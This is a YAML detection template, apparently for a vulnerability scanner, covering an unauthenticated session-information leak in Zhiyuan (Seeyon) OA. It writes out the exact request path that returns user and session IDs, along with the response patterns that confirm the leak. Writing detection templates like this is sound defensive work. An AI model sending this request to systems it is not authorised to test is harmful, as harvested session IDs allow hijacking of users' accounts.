id: "zhiyuan-oa-session-leak"
name: "Zhiyuan OA Session Leak"
severity: "medium"
description: "A vulnerability in Zhiyuan OA allows remote unauthenticated users access to sensitive session information via the 'getSessionList.jsp' endpoint."
tech:
  - "tomcat"
  - "java"
tags:
  - "zhiyuan"
  - "leak"
  - "disclosure"
  - "seeyon"
  - "vuln"
reference: "https://www.zhihuifly.com/t/topic/3345"
spaExclusion: true
request:
  method: "GET"
  path: "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "<usrID>"
      - "<sessionID>"
    condition: "and"
  - type: "status"
    status:
      - 200
